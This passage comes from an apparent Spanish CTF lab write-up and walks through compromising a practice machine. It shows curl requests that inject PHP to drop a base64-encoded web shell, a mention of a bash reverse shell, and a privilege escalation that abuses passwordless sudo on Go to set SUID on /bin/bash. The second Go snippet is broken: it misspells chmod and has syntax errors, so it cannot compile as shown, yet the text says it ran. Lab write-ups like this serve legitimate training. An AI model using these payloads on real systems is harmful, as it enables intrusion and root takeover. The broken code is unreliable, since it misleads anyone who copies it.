+</span></span></code></pre></div><p><img alt="img53" loading="lazy" src="/img/Pasted%20image%2020250830125110.png"></p>
+<p><img alt="img54" loading="lazy" src="/img/Pasted%20image%2020250830125119.png"></p>
+<p>Esto es genial, podemos ver que si se interpretan los comandos, el problema es que se puede complicar un poco el llamar una bash desde allí por lo que vamos a ver si nos permite mediante un comando en el mismo php crear un archivo dentro del directorio con el contenido de que le pasemos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -X PATCH <span style="color:#e6db74">&#34;http://192.168.1.108:5000/ls2o4g/v1.0/posts/1&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -b <span style="color:#e6db74">&#39;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTcxMzk1MTAsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.gSVAhsu_qoHdwGq0gOASuoenyB5IyDRj_gNapKJkPqg&#39;</span> -d <span style="color:#e6db74">$&#39;{&#34;text&#34;:&#34;file_put_contents(\&#39;prueba.txt\&#39;,\&#39;Archivo de prueba\&#39;)&#34;}&#39;</span>
+</span></span></code></pre></div><p><img alt="img55" loading="lazy" src="/img/Pasted%20image%2020250830132820.png"></p>
+<p>Como vemos si se envió, vemos si podemos entrar en el:
+<img alt="img56" loading="lazy" src="/img/Pasted%20image%2020250830132846.png"></p>
+<p>Podemos observar que lo hemos logrado, en este punto vamos a usar:
+Vamos a usar un truco para evitar que por el estar escapando comillas de forma continua tengamos errores y es pasarle la cadena en bae64 del contenido que vamos a ingresar y con la función <code>base64_decode()</code> vamos a decodificar la cadena dejando el texto en el archivo en texto plano de la siguiente manera:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -X PATCH <span style="color:#e6db74">&#34;http://192.168.1.108:5000/ls2o4g/v1.0/posts/1&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -b <span style="color:#e6db74">&#39;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTcxMzk1MTAsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.gSVAhsu_qoHdwGq0gOASuoenyB5IyDRj_gNapKJkPqg&#39;</span> -d <span style="color:#e6db74">$&#39;{&#34;text&#34;:&#34;file_put_contents(\&#39;cmd.php\&#39;,base64_decode(\&#39;PD9waHAKICBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsKPz4K\&#39;))&#34;}&#39;</span>
+</span></span></code></pre></div><p><img alt="img57" loading="lazy" src="/img/Pasted%20image%2020250830133719.png"></p>
+<p>Como vemos ya tenemos configurado esto de forma correcta y veamos si nos funciona:
+<img alt="img58" loading="lazy" src="/img/Pasted%20image%2020250830133749.png">
+Ya podemos ejecutar comandos de forma excelente, ahora si vamos a generar nuestra reverse shell con bash:
+<img alt="img59" loading="lazy" src="/img/Pasted%20image%2020250830133853.png">
+<img alt="img60" loading="lazy" src="/img/Pasted%20image%2020250830133902.png"></p>
+<h1 id="escalada-de-privilegios">Escalada de Privilegios<a hidden class="anchor" aria-hidden="true" href="#escalada-de-privilegios">#</a></h1>
+<p>Y estamos dentro, realicemos el tratamiento y dejemos todo listo para comenzar con el escaneo de la maquina para la escalada de privilegios:
+<img alt="img61" loading="lazy" src="/img/Pasted%20image%2020250830134025.png"></p>
+<p>Listo vamos a comenzar a analizar por permisos SUID:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find <span style="color:#ae81ff">\ </span>-perm -4000 2&gt;/dev/null
+</span></span></code></pre></div><p><img alt="img62" loading="lazy" src="/img/Pasted%20image%2020250830134241.png"></p>
+<p>veamos los usuario para ver si tenemos alguno que nos interese:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/passwd | grep <span style="color:#e6db74">&#34;sh</span>$<span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p><img alt="img63" loading="lazy" src="/img/Pasted%20image%2020250830134406.png"></p>
+<p>Vemos que <code>achilles</code> también es un usuario por lo que podemos ver si se están reciclando credenciales:
+<img alt="img64" loading="lazy" src="/img/Pasted%20image%2020250830134457.png"></p>
+<p>ya estamos como <code>achilles</code> ya que si se estaban reciclando credenciales, en este punto vamos a ver ahora con el usuario<code>achilles</code> si tenemos comandos a ejecutar como sudo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span></code></pre></div><p><img alt="img65" loading="lazy" src="/img/Pasted%20image%2020250830134636.png"></p>
+<p>como podemos observar tenemos permisos para ejecutar como sudo y sin contraseña el binario de <code>/usr/local/go/bin/go</code>.</p>
+<p>Para esto como no conocemos mucho del funcionamiento de go vamos a usar el siguiente código en <code>go</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;fmt&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;os/exec&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">execute</span>(<span style="color:#a6e22e">cmd</span> <span style="color:#66d9ef">string</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">out</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">exec</span>.<span style="color:#a6e22e">Command</span>(<span style="color:#a6e22e">cmd</span>).<span style="color:#a6e22e">Output</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>, <span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Command Successfully Executed&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">output</span> <span style="color:#f92672">:=</span> string(<span style="color:#a6e22e">out</span>[:])
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">output</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">execute</span>(<span style="color:#e6db74">&#34;ls&#34;</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Lo guardamos en un archivo y con el binario de go que nos permite ejecutar comandos con sudo sin passwd vamos ver que sucede:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/local/go/bin/go run cmd.go
+</span></span></code></pre></div><p><img alt="img66" loading="lazy" src="/img/Pasted%20image%2020250830135235.png">
+como vemos si funciona en este punto lo que vamos a hacer es ver si podemos asignarles permisos de SUID a la bash modificando el código de la siguiente manera:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;fmt&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;os/exec&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">execute</span>(<span style="color:#a6e22e">cmd</span> <span style="color:#66d9ef">string</span>, <span style="color:#a6e22e">arg1</span> <span style="color:#66d9ef">string</span>, <span style="color:#a6e22e">arg2</span>, <span style="color:#66d9ef">string</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">out</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">exec</span>.<span style="color:#a6e22e">Command</span>(<span style="color:#a6e22e">cmd</span>, <span style="color:#a6e22e">arg1</span>, <span style="color:#a6e22e">arg2</span>).<span style="color:#a6e22e">Output</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>, <span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Command Successfully Executed&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">output</span> <span style="color:#f92672">:=</span> string(<span style="color:#a6e22e">out</span>[:])
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">output</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">execute</span>(<span style="color:#e6db74">&#34;chdmo&#34;</span> <span style="color:#e6db74">&#34;+s&#34;</span> <span style="color:#e6db74">&#34;/bin/bash&#34;</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /usr/local/go/bin/go run cmd.go
+</span></span></code></pre></div><p><img alt="img67" loading="lazy" src="/img/Pasted%20image%2020250830135844.png"></p>
+<p>Se ejecuto revisemos los permisos de la bash a ver si lo logramos:
+<img alt="img68" loading="lazy" src="/img/Pasted%20image%2020250830135908.png"></p>
+<p>Excelente vamos a subir a root:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -p
+</span></span></code></pre></div><p><img alt="img69" loading="lazy" src="/img/Pasted%20image%2020250830140000.png"></p>
+<p>Listo ya estamos como root, en este punto vamos a ver la flag final:
+<img alt="img70" loading="lazy" src="/img/Pasted%20image%2020250830140032.png"></p>
+<p>Como podemos observar ya esta la Maquina. :)</p>
+
+
+    </div>
+
+    <footer class="post-footer">
+      <ul class="post-tags">
+      </ul>
+    </footer>
+  </article>
+
+  
+  <aside id="sidebar-toc">
+    <div class="sidebar-title">Contenido</div>
+    <ul id="toc-list"></ul>
+  </aside>
+</div>
+
+<style>
+   
+  .post-container {
+    display: flex;
+    flex-direction: row;
+    justify-content: flex-start;
+    position: relative;
+  }
+
+   
+  .post-single {
+    max-width: 850px;
+    flex: 1;
+    padding: 0 1rem;
+  }
+
+   
+  #sidebar-toc {
+    position: fixed;
+    top: 11%;
+    right: 20%;
+    width: 260px;
+    background-color: rgba(25, 25, 25, 0.95);
+    border-radius: 12px;
+    padding: 15px 20px;
+    color: #fff;
+    font-size: 14px;
+    max-height: 80vh;
+    overflow-y: auto;
+    box-shadow: 0 0 15px rgba(0, 0, 0, 0.4);
+    z-index: 1000;
+    transition: all 0.3s ease;
+  }
+
+   
+  .sidebar-title {
+    font-weight: bold;
+    color: #00bfff;
+    margin-bottom: 10px;
+    text-align: center;
+  }
+
+   
+  #toc-list {
+    list-style: none;
+    padding: 0;
+    margin: 0;
+  }
+
+  #toc-list li {
+    margin: 5px 0;
+  }
+
+  #toc-list li.h2 {
+    margin-left: 10px;
+    font-size: 13px;
+  }
+
+  #toc-list li.h3 {
+    margin-left: 20px;
+    font-size: 12px;
+  }
+
+  #toc-list a {
+    color: #9ad0ff;
+    text-decoration: none;
+    transition: color 0.2s ease;
+  }
+
+  #toc-list a:hover {
+    color: #00bfff;
+  }
+
+   
+
+   
+  @media (max-width: 1700px) {
+    #sidebar-toc {
+      right: 15%;
+      width: 220px;
+      font-size: 13px;
+    }
+  }
+
+   
+  @media (max-width: 1440px) {
+
+    .post-container {
+      justify-content: center;
+    }
+
+    #sidebar-toc {
+      position: fixed;
+      top: auto;
+      bottom: 20px;
+      right: 10%;
+      width: auto;
+      padding: 10px 14px;
+      background-color: rgba(0, 0, 0, 0.8);
+      border-radius: 8px;
+      font-size: 13px;
+      max-height: none;
+      overflow: visible;
+      cursor: pointer;
+    }
+
+    #sidebar-toc::after {
+      content: "☰ Contenido";
+      color: #00bfff;
+      font-weight: bold;
+    }
+
+     
+    #toc-list,
+    .sidebar-title {
+      display: none;
+    }
+
+     
+    #sidebar-toc:hover #toc-list {
+      display: block;
+      position: absolute;
+      right: 0;
+      bottom: 40px;
+      width: 220px;
+      background-color: rgba(25, 25, 25, 0.95);
+      border-radius: 8px;
+      padding: 10px;
+    }
+
+    #sidebar-toc:hover .sidebar-title {
+      display: block;
+      text-align: center;
+      margin-bottom: 5px;
+    }
+  }
+</style>
+
+
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    const content = document.querySelector(".post-content");
+    const tocList = document.getElementById("toc-list");
+    if (!content || !tocList) return;
+
+    const headings = content.querySelectorAll("h1, h2, h3");
+    headings.forEach((heading, index) => {
+      const id = heading.id || `section-${index}`;
+      heading.id = id;
+
+      const li = document.createElement("li");
+      li.classList.add(heading.tagName.toLowerCase());
+
+      const a = document.createElement("a");
+      a.href = `#${id}`;
+      a.textContent = heading.textContent;
+
+      li.appendChild(a);
+      tocList.appendChild(li);
+    });
+  });
+</script>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">Hack Stark ×͜×</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+</body>
+
+</html>
